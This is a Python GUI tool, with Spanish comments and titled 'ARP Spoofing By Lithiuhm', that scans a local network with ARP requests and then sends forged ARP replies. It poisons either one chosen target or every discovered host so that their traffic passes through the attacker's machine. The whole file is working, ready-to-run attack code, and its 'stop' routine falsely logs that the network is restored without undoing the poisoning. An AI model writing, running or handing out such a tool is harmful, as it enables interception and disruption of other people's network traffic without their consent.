from tkinter import *
from tkinter import ttk
import scapy.all as scapy
import threading
import socket
import time
import sys
import socket

# Lista para almacenar los dispositivos escaneados
devices_list = []
attack_running = False

# Desactivar los mensajes de Scapy para evitar bloqueos en `--windowed`
scapy.conf.verb = 0

# Función para escanear la red personalizada
def scan_custom_network():
    ip_range = custom_network_text.get()
    if not ip_range:
        log_attack("Por favor, ingrese una red válida en formato CIDR.")
        return
    scan_network(ip_range)

# Función alternativa para obtener la IP de la red local sin netifaces
def get_local_network():
    try:
        # Obtener la IP de salida real consultando un servidor público (Google DNS)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Se conecta a un servidor público de Google
        local_ip = s.getsockname()[0]
        s.close()
        
        # Obtener la subred en base a la IP obtenida
        subnet = ".".join(local_ip.split(".")[:-1]) + ".0/24"
        log_attack(f"Red detectada con internet: {subnet}")
        return subnet
    except Exception as e:
        log_attack(f"Error al obtener la red local: {e}")
        return None

def scan_network(ip_range=None):
    global devices_list
    devices_list.clear()
    table.delete(*table.get_children())  # Limpiar la tabla antes del nuevo escaneo
    progress_bar["value"] = 0  # Reiniciar barra de progreso

    try:
        if ip_range is None:
            ip_range = get_local_network()
        if not ip_range:
            log_attack("No se pudo detectar la red.")
            return

        log_attack(f"Iniciando escaneo de red en {ip_range}...")

        # Crear solicitud ARP
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        answered_list = scapy.srp(broadcast/arp_request, timeout=5, verbose=False)[0]

        if not answered_list:
            log_attack("No se encontraron dispositivos en la red especificada. Asegúrese de que la red es accesible.")
            return

        total_hosts = len(answered_list)
        
        for index, packet in enumerate(answered_list):
            ip = packet[1].psrc
            mac = packet[1].hwsrc
            name = get_nt_name(ip)
            manufacturer = get_mac_vendor(mac)
            devices_list.append((ip, name, mac, manufacturer))

            # Calcular el porcentaje de progreso
            progress = (index + 1) / total_hosts * 100 if total_hosts > 0 else 100

            # Actualizar barra de progreso
            progress_bar["value"] = progress

            # Actualizar el texto dentro de la barra
            progress_label["text"] = f"Escaneo: {int(progress)}%"

            # Refrescar la GUI para mostrar cambios en tiempo real
            root.update_idletasks()


        # Ordenar las IPs antes de insertarlas en la tabla
        devices_list.sort(key=lambda x: list(map(int, x[0].split('.'))))

        for item in devices_list:
            table.insert("", END, values=item)

        log_attack(f"Escaneo completado: {len(devices_list)} hosts encontrados en {ip_range}.")
        progress_bar["value"] = 100  # Completar la barra al 100%

    except Exception as e:
        log_attack(f"Error en el escaneo: {str(e)}")  # Captura errores sin imprimir en consola

# Función para obtener el nombre NT del dispositivo
def get_nt_name(ip):
    try:
        return scapy.sr1(scapy.IP(dst=ip)/scapy.ICMP(), timeout=1, verbose=False).src
    except:
        return "Desconocido"

# Función para obtener el fabricante de la MAC
def get_mac_vendor(mac):
    try:
        return scapy.Ether(mac).src[:8]
    except:
        return "No disponible"

# Función de ataque ARP Spoofing
def arp_spoof(target_ip, router_ip):
    global attack_running
    attack_running = True
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    
    cont=1
    while attack_running:
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip), verbose=False)
        scapy.send(scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip), verbose=False)
        log_attack(f"Lanzando paquetes arp a {target_ip}\nAhora eres: {router_ip}\nPaquetes mandados: {cont}")
        cont+=1
        time.sleep(10)

# Función para obtener la MAC de una IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    response = scapy.srp(arp_request/broadcast, timeout=2, verbose=False)[0]
    return response[0][1].hwsrc if response else None

def get_local_ip():
    """Obtiene la IP local del equipo desde donde se ejecuta el script."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Se conecta a Google DNS para obtener la IP local
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        log_attack(f"Error al obtener la IP local: {e}")
        return None

def start_global_attack():
    global devices_list

    # Obtener la IP local del equipo ejecutando el script
    local_ip = get_local_ip()
    if not local_ip:
        log_attack("No se pudo obtener la IP local. Cancelando ataque global.")
        return

    # Obtener la IP del router ingresada por el usuario
    router_ip = global_router_ip_text.get().strip()
    if not router_ip:
        log_attack("Por favor, ingrese la IP del router antes de iniciar el ataque global.")
        return

    # Si la lista de dispositivos escaneados está vacía, escanear la red primero
    if not devices_list:
        log_attack("No se encontraron dispositivos escaneados. Iniciando escaneo automático...")
        scan_network()

    # Esperar a que el escaneo termine antes de iniciar el ataque
    if not devices_list:  # Si después del escaneo sigue vacía, detener el proceso
        log_attack("No se encontraron dispositivos en la red. No se puede iniciar el ataque.")
        return

    # Filtrar la IP local y la IP del router ingresada por el usuario
    filtered_devices = [device for device in devices_list if device[0] != local_ip and device[0] != router_ip]

    if not filtered_devices:
        log_attack(f"No hay dispositivos disponibles para atacar después de excluir la IP local ({local_ip}) y la del router ({router_ip}).")
        return

    log_attack(f"Iniciando ataque global. Se excluirán las IPs: {local_ip} (equipo local) y {router_ip} (router).")

    # Iniciar el ataque a cada IP en la lista filtrada
    for device in filtered_devices:
        threading.Thread(target=arp_spoof, args=(device[0], router_ip), daemon=True).start()


# Función para iniciar el ataque a una sola IP
def start_single_attack():
    target_ip = single_ip_text.get().strip()
    router_ip = router_ip_text.get().strip()

    # Verificar si ambos campos están completos
    if not target_ip or not router_ip:
        log_attack("Debe ingresar la IP del router y la IP objetivo antes de iniciar el ataque.")
        return

    log_attack(f"Iniciando ataque ARP Spoofing contra {target_ip}, suplantando {router_ip}...")
    
    # Ejecutar el ataque en un hilo para no bloquear la interfaz
    threading.Thread(target=arp_spoof, args=(target_ip, router_ip), daemon=True).start()


# Función para detener el ataque
def stop_attack():
    global attack_running
    attack_running = False
    log_attack("Ataque detenido y red restaurada.")

# Función para registrar log de ataques
def log_attack(message):
    log_text.insert(END, message + "\n")
    log_text.yview(END)

from tkinter import *
from tkinter import ttk
import threading

# Configuración de la ventana principal
root = Tk()
root.title("ARP Spoofing By Lithiuhm")
root.geometry("1100x800")
root.resizable(False, False)

# Marco principal con dos columnas
main_frame = Frame(root)
main_frame.pack(pady=10, padx=10, fill="both", expand=True)

# 🔹 Columna 1: Zona de Escaneo de Red
scan_frame = LabelFrame(main_frame, text="Zona de Escaneo de Red", padx=10, pady=10)
scan_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

Label(scan_frame, text="Red a escanear (CIDR) Ejemplo (192.168.1.0/24):").grid(row=0, column=0, columnspan=2, pady=5, sticky="n")
custom_network_text = Entry(scan_frame, width=25)
custom_network_text.grid(row=1, column=0, padx=5, pady=5)

Button(scan_frame, text="Escanear Red Manual", width=20, command=lambda: threading.Thread(target=scan_custom_network, daemon=True).start()).grid(row=2, column=0, pady=5)
Button(scan_frame, text="AutoScan", width=20, command=lambda: threading.Thread(target=scan_network, daemon=True).start()).grid(row=3, column=0, pady=5)

# Tabla de dispositivos detectados
columns = ("IP", "Nombre", "MAC", "Fabricante")
table = ttk.Treeview(scan_frame, columns=columns, show="headings", height=10)
for col in columns:
    table.heading(col, text=col, anchor=CENTER)
    table.column(col, anchor=CENTER)

table.grid(row=4, column=0, pady=10)

# 🔹 Columna 2: Configuración de Ataques
attack_frame = LabelFrame(main_frame, text="Configuración de Ataque", padx=10, pady=10)
attack_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")

# 🔹 Sección 1: Ataque a IP Específica
single_attack_frame = LabelFrame(attack_frame, text="Ataque a IP Específica", padx=10, pady=10)
single_attack_frame.pack(fill="both", expand=True, pady=5)

Label(single_attack_frame, text="IP del router:").pack(anchor="w")
router_ip_text = Entry(single_attack_frame, width=25)
router_ip_text.pack(padx=5, pady=5)

Label(single_attack_frame, text="IP objetivo:").pack(anchor="w")
single_ip_text = Entry(single_attack_frame, width=25)
single_ip_text.pack(padx=5, pady=5)

Button(single_attack_frame, text="Iniciar Ataque Individual", width=25, command=lambda: threading.Thread(target=start_single_attack, daemon=True).start()).pack(pady=5)

# 🔹 Sección 2: Ataque Global a Todos los Dispositivos
global_attack_frame = LabelFrame(attack_frame, text="Ataque Global", padx=10, pady=10)
global_attack_frame.pack(fill="both", expand=True, pady=5)

Label(global_attack_frame, text="IP del router:").pack(anchor="w")
global_router_ip_text = Entry(global_attack_frame, width=25)
global_router_ip_text.pack(padx=5, pady=5)

Button(global_attack_frame, text="Iniciar Ataque Global", width=25, command=lambda: threading.Thread(target=start_global_attack, daemon=True).start()).pack(pady=5)

# Botón para detener ataques
Button(attack_frame, text="Detener Ataque", width=25, command=stop_attack).pack(pady=5)

# Frame para contener la barra y el texto, asegurando que el texto esté arriba
progress_frame = Frame(scan_frame)
progress_frame.grid(row=5, column=0, columnspan=2, pady=10, sticky="ew")

# Texto de progreso encima de la barra
progress_label = Label(progress_frame, text="Progreso del escaneo: 0%", font=("Arial", 10, "bold"))
progress_label.pack(side="top", pady=2)  # Se coloca arriba de la barra

# Barra de progreso centrada
progress_bar = ttk.Progressbar(progress_frame, orient="horizontal", length=300, mode="determinate")
progress_bar.pack(fill="x", padx=10)


# 🔹 Área de Log
log_frame = LabelFrame(root, text="Log de Actividad", padx=10, pady=10)
log_frame.pack(fill="both", padx=10, pady=10)

log_text = Text(log_frame, height=15, width=100)
log_text.pack()

root.mainloop()
